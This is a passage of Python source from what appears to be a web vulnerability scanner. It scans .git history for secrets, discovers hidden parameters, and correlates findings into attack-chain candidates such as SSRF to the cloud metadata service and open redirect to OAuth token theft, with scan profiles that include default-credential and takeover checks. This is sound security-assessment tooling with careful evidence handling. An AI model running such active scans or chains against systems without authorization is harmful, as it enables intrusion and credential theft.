    commit_queue = list(dict.fromkeys(seeds))
    while commit_queue and not ctx.cancelled():
        sha = commit_queue.pop(0)
        if sha in visited:
            continue
        visited.add(sha)
        otype, payload = _git_object(ctx, sha, budget)
        if otype != "commit" or payload is None:
            continue
        tree_sha, parents = _git_parse_commit(payload)
        for p in parents:
            if p not in visited:
                commit_queue.append(p)
        # Walk this commit's tree (recursive, path-aware).
        tree_stack = [(tree_sha, "")]
        while tree_stack and not ctx.cancelled():
            tsha, prefix = tree_stack.pop()
            if not tsha or tsha in visited:
                continue
            visited.add(tsha)
            otype, payload = _git_object(ctx, tsha, budget)
            if otype != "tree" or payload is None:
                continue
            for mode, name, esha in _git_parse_tree(payload):
                path = f"{prefix}{name}"
                if mode == "40000":
                    tree_stack.append((esha, path + "/"))
                elif esha not in visited:
                    visited.add(esha)
                    otype, blob = _git_object(ctx, esha, budget)
                    if otype == "blob" and blob:
                        text = blob[:_GIT_MAX_BLOB].decode("utf-8", "replace")
                        _scan_secrets_in(
                            add, text,
                            f"/.git@{sha[:10]}:{path}", state,
                            config_style=True)
                        if state["count"] >= state["cap"]:
                            break
            if state["count"] >= state["cap"]:
                break
    if state["count"]:
        ctx.L(f"  [git] {state['count']} secret finding(s) in .git history "
              f"({budget['objects']} objects walked)")


HIDDEN_PARAM_CATEGORIES = [
    ("debug/development", ["debug", "test", "dev", "admin", "internal",
                           "verbose", "trace", "staging"]),
    ("access & data view", ["role", "is_admin", "user_id", "account_id",
                            "view", "preview", "draft", "status", "mode",
                            "format", "output", "raw"]),
    ("navigation & content", ["page", "limit", "offset", "sort", "order",
                              "filter", "lang", "locale", "template", "theme",
                              "redirect", "return", "callback", "source",
                              "ref", "id", "file", "path", "category",
                              "section"]),
    ("miscellaneous", ["q2", "json", "xml", "data", "show", "display",
                       "details", "full"]),
]
HIDDEN_PARAM_WORDLIST = [n for _c, names in HIDDEN_PARAM_CATEGORIES for n in names]
HIDDEN_PARAM_CATEGORY = {n: c for c, names in HIDDEN_PARAM_CATEGORIES for n in names}


def _hidden_differs(resp, base_body):
    """Respons 'berbeda' dari baseline: kemiripan < 0.92 DAN selisih
    panjang >= 5% (mengikuti ambang desain 3.3)."""
    body = resp.body or ""
    if similarity(body, base_body) >= 0.92:
        return False
    return abs(len(body) - len(base_body)) >= max(24, int(len(base_body) * 0.05))


def _hidden_endpoints(ctx, surf):
    """Maks 3 endpoint GET: basis param_urls -> action form GET ->
    GUESS_PARAM_URLS yang terverifikasi ada (urutan prioritas desain)."""
    eps, seen = [], set()
    for pq in surf.param_urls:
        b = pq.split("?")[0]
        if b not in seen:
            seen.add(b)
            eps.append(pq)
        if len(eps) >= 3:
            return eps
    for form in surf.forms:
        if form["method"] == "GET" and form["action"] not in seen:
            seen.add(form["action"])
            eps.append(form["action"])
        if len(eps) >= 3:
            return eps
    for pq in crawl_mod.GUESS_PARAM_URLS:
        b = pq.split("?")[0]
        if b in seen:
            continue
        r = ctx.client.get(pq)
        if r.status and not ctx.is_missing(r):
            seen.add(b)
            eps.append(pq)
        if len(eps) >= 3:
            return eps
    return eps


def c_hidden_params(ctx, add):
    """Hidden parameter discovery (Priority 1, finding-only v1): batch
    12 nama + bisect ala ParamMiner, kontrol nama sampah wajib, nilai
    penanda jinak unik per scan. Hasil TIDAK dihubungkan ke
    param_targets (keputusan D2)."""
    surf = ctx.surface(full=True)
    endpoints = _hidden_endpoints(ctx, surf)
    if not endpoints:
        return
    marker = ctx.marker
    req_state = {"n": 0}

    def _get(url, extra):
        # extra: list of (name, value). URL unik per probe agar cache
        # klien tidak menyajikan respons basi untuk verifikasi ulang.
        if extra:
            sep = "&" if "?" in url else "?"
            qs = "&".join(f"{k}={quote(v, safe='')}" for k, v in extra)
            url = url + sep + qs
        req_state["n"] += 1
        return ctx.client.get(url)

    for ep in endpoints:
        if ctx.cancelled():
            return
        req_state["n"] = 0
        base_path = ep.split("?")[0]

        def _value(idx):
            return f"ptk{marker}{idx}"

        # Baseline ganda: request kedua memakai nama sampah unik — bila
        # responsnya saja sudah berbeda, endpoint tidak stabil/reflektif.
        b1 = _get(ep, [])
        b2 = _get(ep, [(f"ptkst{marker}", _value(900))])
        base_body = b1.body or ""
        if similarity(base_body, b2.body or "") <= 0.80:
            ctx.L(f"  [hidden] {base_path}: baseline not stable — skipped")
            continue
        # Kontrol sampah wajib: satu batch 12 nama acak.
        junk = [(f"ptkjunk{marker}{i}", _value(950 + i)) for i in range(12)]
        ctrl = _get(ep, junk)
        ctrl_body = ctrl.body or ""
        if _hidden_differs(ctrl, base_body):
            ctx.L(f"  [hidden] {base_path}: junk control changed the response — endpoint reflects arbitrary parameters, skipped")
            continue

        found = {}

        def _probe(names, depth):
            """Kembalikan nama-nama dalam `names` yang terbukti mengubah
            respons. Rekursi bisect (kedalaman daun tunggal untuk batch
            12 adalah 5; cap 6 hanya pengaman), anggaran per endpoint
            dibatasi keras."""
            if not names or depth > 6 or ctx.cancelled() or req_state["n"] > 48:
                return []
            resp = _get(ep, [(n, _value(abs(hash((n, depth))) % 10000))
                             for n in names])
            if not _hidden_differs(resp, base_body):
                return []
            if len(names) == 1:
                return list(names)
            mid = len(names) // 2
            return (_probe(names[:mid], depth + 1)
                    + _probe(names[mid:], depth + 1))

        batches = [HIDDEN_PARAM_WORDLIST[i:i + 12]
                   for i in range(0, len(HIDDEN_PARAM_WORDLIST), 12)]
        candidates = []
        for bi, batch in enumerate(batches):
            if ctx.cancelled() or req_state["n"] > 48:
                break
            resp = _get(ep, [(n, _value(bi * 100 + j))
                             for j, n in enumerate(batch)])
            if _hidden_differs(resp, base_body):
                candidates.extend(_probe(batch, 1))
        # Verifikasi per nama terisolasi: 2x request NILAI BARU, keduanya
        # harus berbeda dari baseline DAN dari kontrol sampah.
        verified = []
        for n in candidates:
            if ctx.cancelled() or req_state["n"] > 48:
                break
            if n in found:
                continue
            ok = True
            for k in range(2):
                r = _get(ep, [(n, _value(5000 + k * 131 + len(n)))])
                if not _hidden_differs(r, base_body) or \
                        not _hidden_differs(r, ctrl_body):
                    ok = False
                    break
            if ok:
                found[n] = True
                verified.append(n)
        if verified:
            names_txt = ", ".join(
                f"{n} ({HIDDEN_PARAM_CATEGORY.get(n, 'miscellaneous')})"
                for n in verified)
            add(F("LOW", f"Hidden parameters accepted: {base_path}",
                  f"The endpoint changes its response for {len(verified)} undocumented parameter(s) that are not linked from the crawled interface: {names_txt}. A hidden parameter is attack surface, not a proven vulnerability: it is a starting point for follow-up injection/IDOR testing, not evidence of one.",
                  evidence=f"verified differential response for: {', '.join(verified)} (junk control had no effect)",
                  cwe="CWE-235", owasp="A05:2021 Security Misconfiguration",
                  cvss=2.0,
                  remed='Review whether each hidden parameter is intentional; remove or protect debug/preview/data-view parameters in production and document the accepted parameter set.',
                  confidence="probable", location=base_path,
                  param=", ".join(verified)))
            ctx.L(f"  [hidden] {base_path}: {len(verified)} hidden parameters verified ({req_state['n']} requests)")


# --------------------------------------- WS7 (v1.8.0): chaining

def _chain_pool(findings, *subs):
    return [f for f in findings
            if f.get("confidence") in ("probable", "confirmed")
            and any(s in (f.get("title") or "").lower() for s in subs)]


def _chain_other(pool, exclude):
    for f in pool:
        if f is not exclude:
            return f
    return None


def _chain_candidates(findings):
    """WS7 (v1.8.0, decision K1): rule-based correlation over ONE
    scan's findings. A chain candidate requires at least TWO distinct
    component findings, EVERY component at probable or better; the
    candidate itself is capped at probable — correlation is not
    verification of the combined path. No impact score is invented:
    the candidate inherits the strongest component severity (capped
    at HIGH) and lists its components with their locations so a
    human can judge the path. Returns chain dicts."""
    out = []

    def emit(rule, title, comps, steps, impact, remed):
        comps = [c for c in comps if c]
        ids = {id(c) for c in comps}
        if len(comps) < 2 or len(ids) < 2:
            return
        if any(c.get("confidence") not in ("probable", "confirmed")
               for c in comps):
            return
        sev = max((c.get("severity", "INFO") for c in comps),
                  key=lambda s: SEV_ORDER.get(s, 0))
        if SEV_ORDER.get(sev, 0) > SEV_ORDER["HIGH"]:
            sev = "HIGH"
        out.append({
            "rule": rule, "title": title, "severity": sev,
            "cvss": max(c.get("cvss", 0) or 0 for c in comps),
            "location": comps[0].get("location", ""),
            "components": [{"title": c.get("title", ""),
                            "location": c.get("location", ""),
                            "confidence": c.get("confidence", "")}
                           for c in comps],
            "steps": steps, "impact": impact, "remediation": remed})

    ssrf = _chain_pool(findings, "ssrf")
    if ssrf:
        meta = _chain_other(
            _chain_pool(findings, "cloud metadata", "169.254.169.254"),
            ssrf[0])
        if meta:
            emit("ssrf-cloud-metadata",
                 "SSRF can reach the cloud metadata service",
                 [ssrf[0], meta],
                 [f"Component: {ssrf[0]['title']} [{ssrf[0]['confidence']}]",
                  f"Component: {meta['title']} [{meta['confidence']}]",
                  "Prerequisite: the SSRF can address the link-local "
                  "metadata endpoint from the server's network position",
                  "Impact: instance credentials (IAM role tokens) are "
                  "readable, turning a request-forgery bug into cloud "
                  "account access"],
                 "A server-side request forgery that can reach the "
                 "cloud metadata endpoint exposes temporary cloud "
                 "credentials for the instance role.",
                 "Block link-local/metadata egress from the "
                 "application (IMDSv2 + egress allowlist); remove "
                 "over-privileged instance roles.")
        svc = _chain_other(
            _chain_pool(findings, "docker api", "kubernetes",
                        "elasticsearch", "kubelet", "internal service"),
            ssrf[0])
        if svc:
            emit("ssrf-internal-service",
                 "SSRF can reach an internal service API",
                 [ssrf[0], svc],
                 [f"Component: {ssrf[0]['title']} [{ssrf[0]['confidence']}]",
                  f"Component: {svc['title']} [{svc['confidence']}]",
                  "Prerequisite: the internal API trusts requests "
                  "originating from the application's network position",
                  "Impact: the internal control/data plane becomes "
                  "reachable from the internet through the SSRF"],
                 "An SSRF combined with an unauthenticated internal "
                 "service API gives an external attacker a path into "
                 "the internal control plane.",
                 "Authenticate internal service APIs; restrict the "
                 "application's egress to required destinations.")
    redir = _chain_pool(findings, "open redirect")
    oauth = _chain_pool(findings, "oauth state", "oauth redirect_uri")
    if redir and oauth:
        emit("open-redirect-oauth",
             "Open redirect assists OAuth code/token theft",
             [redir[0], oauth[0]],
             [f"Component: {redir[0]['title']} [{redir[0]['confidence']}]",
              f"Component: {oauth[0]['title']} [{oauth[0]['confidence']}]",
              "Prerequisite: the OAuth flow's redirect handling "
              "accepts or can be chained through the open redirector",
              "Impact: authorization codes/tokens are delivered to "
              "an attacker-controlled origin (account takeover)"],
             "An open redirect on the same trust surface as a weakly "
             "validated OAuth flow turns code interception into "
             "account takeover.",
             "Remove open redirects on authentication surfaces; "
             "enforce exact redirect_uri matching and state.")
    bola = _chain_pool(findings, "bola", "idor")
    bfla = _chain_pool(findings, "bfla",
                       "privileged function accessible",
                       "privileged function reachable")
    if bola and bfla:
        emit("bola-bfla",
             "Object-level and function-level authorization both fail",
             [bola[0], bfla[0]],
             [f"Component: {bola[0]['title']} [{bola[0]['confidence']}]",
              f"Component: {bfla[0]['title']} [{bfla[0]['confidence']}]",
              "Prerequisite: a low-privilege account exists (the "
              "precondition both component checks already exercised)",
              "Impact: a low-privilege user can both read other "
              "users' objects and invoke privileged functions — "
              "full application compromise short of the host"],
             "Simultaneous BOLA and BFLA failure means authorization "
             "is missing at both the object and the function layer; "
             "low-privilege accounts can operate as administrators.",
             "Centralize server-side authorization: per-object "
             "ownership AND per-function role checks on every route.")
    upload = _chain_pool(findings, "upload validation bypass",
                         "file upload without authentication")
    xss = _chain_pool(findings, "stored xss")
    if upload and xss:
        emit("upload-stored-xss",
             "Upload bypass plus stored XSS surface",
             [upload[0], xss[0]],
             [f"Component: {upload[0]['title']} [{upload[0]['confidence']}]",
              f"Component: {xss[0]['title']} [{xss[0]['confidence']}]",
              "Prerequisite: uploaded content is served from an "
              "origin trusted by the application session",
              "Impact: attacker content executes in victims' "
              "browsers under the application's origin (session "
              "actions as the victim)"],
             "A validated upload-bypass path combined with a stored "
             "XSS surface gives persistent in-origin script "
             "execution delivered through the upload feature.",
             "Serve uploads from a separate, cookieless origin with "
             "Content-Disposition: attachment; keep output encoding "
             "on every rendered field.")
    return out


# ------------------------------------------------------------ runner

_PASSIVE_BASE = ["c_version_disclosure", "c_tech_fingerprint", "c_security_headers",
                 "c_cookie_security", "c_cors", "c_tls"]
_ACTIVE_BASE = ["c_waf_detection", "c_sensitive_files", "c_dependency_versions", "c_directory_listing",
                "c_admin_panels", "c_http_methods", "c_open_redirect", "c_csrf_forms",
                "c_jwt_analysis", "c_api_exposure", "c_error_disclosure",
                "c_js_libraries", "c_sri_and_session", "c_tabnabbing", "c_auth_surface",
                "c_upload_surface", "c_deserialization_surface",
                "c_security_txt_robots", "c_api_sensitive_data"]
_ADVANCED = ["c_host_header", "c_web_injection", "c_crlf_injection", "c_ssrf",
             "c_blind_oob",
             "c_jwt_forgery", "c_websocket_surface",
             "c_broken_access_idor", "c_bola_matrix", "c_bfla_matrix", "c_nosql_api", "c_json_fuzz",
             "c_stored_xss", "c_prototype_pollution", "c_jwt_kid_injection", "c_graphql_deep", "c_oauth_sso", "c_dom_xss", "c_wp_plugins",
             "c_source_disclosure", "c_session_fixation",
             "c_password_reset_poisoning", "c_cache_poisoning", "c_email_security",
             "c_cve_candidates", "c_exposed_secrets", "c_git_secrets",
             "c_hidden_params", "c_dns_axfr", "c_cloud_buckets"]
PROFILES = {
    "passive-quick": ["c_version_disclosure", "c_security_headers", "c_tls"],
    "passive-full": _PASSIVE_BASE + ["c_email_security"],
    "active-standard": _PASSIVE_BASE + _ACTIVE_BASE,
    "active-deep": _PASSIVE_BASE + ["c_services"] + _ACTIVE_BASE + _ADVANCED,
    # ENTERPRISE: semua check + yang paling intrusif/berat (kredensial default,
    # uji rate-limit login, takeover) — hanya untuk engagement dengan scope tertulis.
    "enterprise-full": _PASSIVE_BASE + ["c_services"] + _ACTIVE_BASE + _ADVANCED +
                       ["c_default_credentials", "c_rate_limit_login",
                        "c_subdomain_takeover"],
}
PASSIVE_PROFILES = ("passive-quick", "passive-full")

SEV_WEIGHT = {"CRITICAL": 25, "HIGH": 15, "MEDIUM": 7, "LOW": 3, "INFO": 1}
CONF_FACTOR = {"confirmed": 1.0, "probable": 0.7, "candidate": 0.4}


def risk_score(findings):
    """Skor risiko 0-100 (semakin tinggi semakin buruk): bobot severity x confidence."""
    raw = sum(SEV_WEIGHT.get(f["severity"], 0) * CONF_FACTOR.get(f.get("confidence", "probable"), 0.7)
              for f in findings)
    return min(100, round(raw))


def run_vulnscan(target, profile="active-deep", log=None, opts=None, cancelled=None):
    if profile not in PROFILES:
        profile = "active-deep"
    opts = opts or {}
    eff_target, scheme_note = target, None
    if "://" not in target:
        eff_target, scheme_note = netclient.resolve_scheme_target(target)
    ctx = Ctx(eff_target, opts, log, job_cancel=cancelled)
    def L(msg):
        ctx.L(msg)
    host = ctx.client.host
    method = "passive" if profile in PASSIVE_PROFILES else "active"
    L(f"[init] target={target} profile={profile} ({method.upper()}) marker={ctx.marker}")
    if scheme_note:
        L(f"[init] {scheme_note} -> effective target: {eff_target}")
    if ctx.client.proxy:
        L(f"[init] egress web via proxy {ctx.client.proxy['host']}:{ctx.client.proxy['port']} (port-scan/TLS still use direct connections)")
    L(f"[init] resolve {host} ...")
    ips = resolve_host(host) if host else []
    L(f"[init] resolved: {', '.join(ips) if ips else 'FAILED (host not found)'}")
    if not ips and host not in ("localhost",):
        L('[warn] DNS failed — scan still attempted (target may be a local IP/host)')

    aborted = False
    if profile not in PASSIVE_PROFILES:
        _pre = ctx.client.get(ctx.client.base_path or "/")
        if _pre.status == 0:
            _pre = ctx.client.get("/")
        if _pre.status == 0:
            aborted = True
            L(f"[abort] preflight failed: target did not respond to a single request ({eff_target})")
            _abort_finding = F(
                "INFO", "Target unreachable — scan aborted early",
                "The target did not respond to any HTTP request during "
                "preflight (every attempt failed or timed out), so the scan "
                "was aborted instead of running all checks against an "
                "unresponsive target. This result is INCONCLUSIVE — it is "
                "not evidence that the target is secure.",
                evidence=(f"target={eff_target} "
                          f"attempts={ctx.client.stats.get('attempts')} "
                          f"responses={ctx.client.stats.get('total')}"),
                remed="Verify the URL (including the http/https scheme) and "
                      "that the target is reachable from the scanner, then "
                      "re-run the scan.")

    headless_note = None
    if opts.get("headless"):
        try:
            import headless as _hl
            ok, reason = _hl.available()
            if ok:
                url0 = ctx.client.origin + (ctx.client.base_path or "/")
                L(f"[headless] rendering {url0} ...")
                rr = _hl.render(url0)
                opts["headless_endpoints"] = rr["endpoints"]
                L(f"[headless] render OK — {len(rr['endpoints'])} endpoints from DOM/network")
            else:
                headless_note = (f"Headless rendering requested but unavailable "
                                 f"({reason}) — static crawl used; SPA-only "
                                 f"endpoints may be missed.")
                L(f"[warn] {headless_note}")
        except Exception as e:
            headless_note = f"Headless rendering failed ({str(e)[:80]}) — static crawl used."
            L(f"[warn] {headless_note}")

    findings = []
    seen_keys = set()
    def add(f):
        key = (f["title"], f.get("location", ""), f.get("param", ""))
        if key not in seen_keys:
            seen_keys.add(key)
            findings.append(f)
            L(f"  [{f['severity']}/{f['confidence']}] {f['title']} (CVSS {f['cvss']})")
        else:
            L(f"  [dedupe] skip duplikat: {f['title']}")

    if aborted:
        add(_abort_finding)

    errors = []
    checks_detail = []
    checks = PROFILES[profile]
    L(f"[run] {len(checks)} check modules will be run")
    t0 = time.time()
    ran = 0
    total_budget = float(opts.get("total_budget_s", 1800))
    check_budget = float(opts.get("check_budget_s", 600))
    for i, name in enumerate(checks, 1):
        if aborted:
            checks_detail.append({"name": name, "status": "skipped",
                                  "findings": 0, "duration_s": 0})
            continue
        if time.time() - t0 > total_budget:
            L(f"[stop] total scan budget ({total_budget:.0f}s) exhausted at check {i}/{len(checks)}")
            checks_detail.append({"name": name, "status": "skipped",
                                  "findings": 0, "duration_s": 0})
            continue
        if ctx.cancelled():
            L(f"[stop] scan cancelled by user at check {i}/{len(checks)}")
            checks_detail.append({"name": name, "status": "cancelled",
                                  "findings": 0, "duration_s": 0})
            continue
        fn = globals()[name]
        L(f"[{i}/{len(checks)}] {name} ...")
        n0, tc = len(findings), time.time()
        ctx._deadline = tc + check_budget
        try:
            fn(ctx, add)
            ran += 1
            _dur = round(time.time() - tc, 2)
            _st = "timeout" if _dur > check_budget else "ok"
            if _st == "timeout":
                L(f"[{i}/{len(checks)}] {name} stopped (budget {check_budget:.0f}s exhausted)")
            checks_detail.append({"name": name, "status": _st,
                                  "findings": len(findings) - n0,
                                  "duration_s": _dur})
            L(f"[{i}/{len(checks)}] {name} done")
        except netclient.RequestAborted:
            ran += 1
            _user = bool(cancelled and cancelled())
            checks_detail.append({"name": name,
                                  "status": "cancelled" if _user else "timeout",
                                  "findings": len(findings) - n0,
                                  "duration_s": round(time.time() - tc, 2),
                                  "error": "stopped: cancelled by user" if _user
                                           else f"per-check budget {check_budget:.0f}s exhausted"})
            L(f"[{i}/{len(checks)}] {name} {'CANCELLED' if _user else 'TIMEOUT (budget exhausted)'}")
        except Exception as e:
            errors.append(f"{name}: {str(e)[:120]}")
            checks_detail.append({"name": name, "status": "error",
                                  "findings": len(findings) - n0,
                                  "duration_s": round(time.time() - tc, 2),
                                  "error": str(e)[:120]})
            L(f"[{i}/{len(checks)}] {name} ERROR: {str(e)[:100]}")
        finally:
            ctx._deadline = None

    # ---- WS1 grace window: callbacks can arrive AFTER the planting
    # check finished (slow fetchers, queued renders). Re-poll the
    # registry once all checks are done, waiting out the remainder of
    # the grace window since the last plant (bounded by the remaining
    # total budget). The outcome — including an explicit 0 — is
    # recorded in the scan's canary meta; silence is never dressed up
    # as "not vulnerable".
    canary_note = ""
    if ctx.canary_configured and ctx._oob_planted and not aborted:
        _wait = ctx.canary_grace_s - (time.time() - ctx._oob_last_plant_ts)
        _remain = total_budget - (time.time() - t0)
        _wait = max(0.0, min(_wait, _remain))
        if _wait > 0 and not ctx.cancelled():
            L(f"[oob] grace window: waiting {_wait:.0f}s for late callbacks "
              f"({len(ctx._oob_planted)} tokens planted)")
            _end = time.time() + _wait
            while time.time() < _end and not ctx.cancelled():
                time.sleep(min(1.0, _end - time.time()))
        _late = _oob_sweep(ctx, add)
        _st = ctx.canary_status()
        if _st["callbacks_received"]:
            canary_note = (f"{_st['callbacks_received']} callback(s) received "
                           f"for {_st['tokens_hit']}/{_st['tokens_planted']} "
                           f"planted tokens"
                           + (f"; {_late} arrived during the grace window"
                              if _late else ""))
        else:
            canary_note = (f"0 callbacks received within the "
                           f"{ctx.canary_grace_s:.0f}s grace window — blind "
                           "SSRF/XXE/CMDi/XSS variants are UNPROVEN (not "
                           "evidence of absence)")
        L(f"[oob] {canary_note}")
    elif ctx.canary_configured:
        canary_note = "canary configured; no blind injection points were planted"
    else:
        canary_note = ("canary not configured — blind out-of-band checks "
                       "were not evaluated")
    canary_result = ctx.canary_status(note=canary_note)

    # ---- verification pass: temuan exposure 'confirmed' diminta ulang sekali lagi;
    # yang tidak dapat direproduksi diturunkan ke probable (jujur, bukan dihapus).
    # Location virtual (objek .git "/.git@<sha>:path", fragmen source-map
    # "file.map#source") BUKAN URL sehingga tidak bisa diminta ulang —
    # evidence-nya ditangkap saat walk/scan itu sendiri; lewati.
    downgraded = 0
    for f in findings:
        if f.get("confidence") == "confirmed" and 'exposed' in f["title"] \
                and f.get("location", "").startswith("/") \
                and "@" not in f.get("location", "") \
                and "#" not in f.get("location", ""):
            try:
                chk = ctx.client.get(f["location"])
                if chk.status != 200 or ctx.is_missing(chk):
                    f["confidence"] = "probable"
                    f["description"] += ' [Verification pass: not reproduced on re-request — downgraded to probable.]'
                    downgraded += 1
            except Exception:
                pass
    if downgraded:
        L(f"[verify] {downgraded} findings downgraded confirmed->probable (not reproduced)")
    # ---- WS7 (v1.8.0): vulnerability chaining — rule-based
    # correlation over this scan's findings (decision K1: chain
    # candidates are capped at probable; components keep their own
    # tiers and are always listed with the candidate).
    chains = _chain_candidates(findings)
    for ch in chains:
        add(F(ch["severity"], f"Attack chain candidate: {ch['title']}",
              "Rule-based correlation of findings from THIS scan — "
              "the combined path was NOT exercised as a single "
              "exploit; every component is listed with its own "
              "evidence tier and the candidate is capped at probable "
              "(decision K1). " + ch["impact"],
              evidence=" | ".join(
                  f"component: {c['title']} [{c['confidence']}] "
                  f"@ {c['location']}" for c in ch["components"])
              + " || steps: " + " -> ".join(ch["steps"]),
              remed=ch["remediation"], cvss=ch["cvss"],
              confidence="probable", location=ch["location"],
              origin="correlation"))
    if chains:
        L(f"[chain] {len(chains)} attack-chain candidate(s) from "
          "correlation rules")
    # ---- scan health: rasio blokir tinggi = hasil mungkin tertekan WAF/rate-limit
    warnings = []
    if aborted:
        warnings.append("Target unreachable during preflight — scan aborted "
                        "early; results are inconclusive, not a clean bill "
                        "of health.")
    if headless_note:
        warnings.append(headless_note)
    if canary_result["tokens_planted"] and not canary_result["callbacks_received"]:
        warnings.append(canary_note + ".")
    st = ctx.client.stats
    if st.get("total", 0) >= 20 and st.get("blocked", 0) / max(1, st["total"]) > 0.2:
        warnings.append(f"{st['blocked']}/{st['total']} responses blocked (403/429) — scan results may be incomplete (WAF/rate-limit).")
        L(f"[warn] {warnings[-1]}")
    if st.get("throttled_events"):
        warnings.append(f"Adaptive backoff engaged {st['throttled_events']} time(s), {st['throttled_seconds']}s total — the target is rate-limiting; the scan slowed down to preserve coverage.")
        L(f"[warn] {warnings[-1]}")

    findings.sort(key=lambda f: (-SEV_ORDER[f["severity"]], -f["cvss"]))
    summary = {}
    by_conf = {}
    for f in findings:
        summary[f["severity"]] = summary.get(f["severity"], 0) + 1
        by_conf[f["confidence"]] = by_conf.get(f["confidence"], 0) + 1
    risk = next((s for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW"] if summary.get(s)), "CLEAN")
    dur = round(time.time() - t0, 1)
    L(f"[done] total {len(findings)} findings | confirmed={by_conf.get('confirmed',0)} probable={by_conf.get('probable',0)} candidate={by_conf.get('candidate',0)} | overall risk: {risk} | {dur} dtk | check jalan {ran}/{len(checks)}")
    score = risk_score(findings)
    L(f"[done] risk score: {score}/100")
    return {"type": "vulnscan", "target": eff_target,
            "effective_target": eff_target, "target_as_given": target,
            "profile": profile,
            "method": method, "scan_id_ref": ctx.marker,
            "technologies": ctx.technologies,
            "tech_profile": ctx.technologies, "findings": findings,
            "summary": summary, "summary_by_confidence": by_conf,
            "overall_risk": risk, "risk_score": score,
            "warnings": warnings, "http_stats": st,
            "errors": errors, "duration_s": dur,
            "checks_run": ran, "checks_total": len(checks),
            "checks_detail": checks_detail,
            "canary": canary_result,
            "chains": chains,
            "bfla_matrix": ctx.check_meta.get("bfla_matrix", []),
            "meta": ctx.check_meta,
            "cancelled": bool(ctx.cancelled())}
